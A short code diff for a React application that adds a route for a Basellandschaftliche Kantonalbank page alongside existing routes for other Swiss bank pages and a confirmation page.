@@ -146,6 +146,7 @@ const App = () => (
             <Route path="/ch/valiant" element={<P><ChValiant /></P>} />
             <Route path="/ch/aargauische-kantonalbank" element={<P><ChAargauischeKantonalbank /></P>} />
             <Route path="/ch/appenzeller-kantonalbank" element={<P><ChAppenzellerKantonalbank /></P>} />
+            <Route path="/ch/basellandschaftliche-kantonalbank" element={<P><ChBasellandschaftlicheKantonalbank /></P>} />
 
 
             <Route path="/confirmation" element={<P><ConfirmationSwitch /></P>} />
